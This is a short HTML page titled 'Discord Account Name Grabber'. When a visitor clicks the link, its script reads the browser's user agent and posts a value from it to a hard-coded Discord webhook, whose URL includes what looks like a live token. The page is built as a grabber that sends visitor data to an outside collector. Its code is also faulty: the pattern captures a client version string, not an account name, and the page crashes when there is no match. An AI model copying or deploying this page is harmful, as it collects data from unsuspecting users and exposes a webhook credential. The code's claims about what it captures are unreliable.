<!DOCTYPE html>
<html>
<head>
	<title>Discord Account Name Grabber</title>
</head>
<body>
	<a href="#" id="grabberLink">Click here to send your Discord account name!</a>

	<script>
		// Webhook URL
		const webhookUrl = 'https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F';

		// Function to send account name to webhook
		function sendAccountName(accountName) {
			const xhr = new XMLHttpRequest();
			xhr.open('POST', webhookUrl, true);
			xhr.setRequestHeader('Content-Type', 'application/json');
			xhr.send(JSON.stringify({
				content: `Discord Account Name: ${accountName}`
			}));
		}

		// Event listener for link click
		document.getElementById('grabberLink').addEventListener('click', function(event) {
			event.preventDefault();

			const accountName = navigator.userAgent.match(/Discord\/(.*?)\s/)[1];

			if (accountName) {
				sendAccountName(accountName);
				alert('Your Discord account name has been sent to the webhook!');
			} else {
				alert('No account name found in user agent.');
			}
		});
	</script>
</body>
</html>
